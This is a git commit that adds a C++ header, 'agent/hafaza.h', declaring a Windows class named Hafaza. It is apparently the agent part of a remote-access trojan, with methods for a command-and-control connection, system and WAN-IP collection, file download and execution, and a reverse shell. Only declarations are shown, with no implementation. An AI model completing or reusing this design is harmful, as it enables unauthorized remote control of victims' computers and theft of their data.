89dc97b2a217dda27c2cedb2ba1e6c139baeb475
Fahad Mustafa <fahad.mustafa0012@gmail.com>
2019-07-04 23:02:15 +0500

    3

---
+++ agent/hafaza.h
@@ -0,0 +1,52 @@
+#ifndef Hafaza_
+#define Hafaza_
+
+//#include "pch.h"
+#include <iostream>
+//#include <winSock2.>
+#include <windows.h>
+#include <wininet.h>
+#include <lmcons.h>
+#include <tchar.h>
+#include <string>
+#include <cstring>
+#include <sstream>
+#include <fstream>
+
+#pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "wininet.lib")
+#define BUFFER 1024
+
+
+static bool connected = false;
+// ZeroMemory < memset
+class Hafaza {
+public:
+	char username[UNLEN+1];
+	char hostname[MAX_COMPUTERNAME_LENGTH + 1];
+	TCHAR DIR[MAX_PATH];
+	DWORD len = UNLEN+1;
+	DWORD hlen = sizeof(hostname) / sizeof(hostname[0]);
+	char wanip[500];
+	SOCKET sockfd;
+	char recvbuf[BUFFER];
+	char* file_commands[5];
+	char* msgbox[5];
+	char* fcommands[5];
+	char* cmd[5];
+	char filebuf[BUFFER];
+	struct sockaddr_in server;
+	void strsplit(char src[500], char* dest[5]);
+	void C2Connect();
+	void ConnectionManage();
+	void respond(const char* data);
+	std::string GetSysinfo();
+	void Wanip();
+	void recvFile();
+	void ExecuteFile(char* filename);
+	void RShell();
+};
+
+
+
+#endif
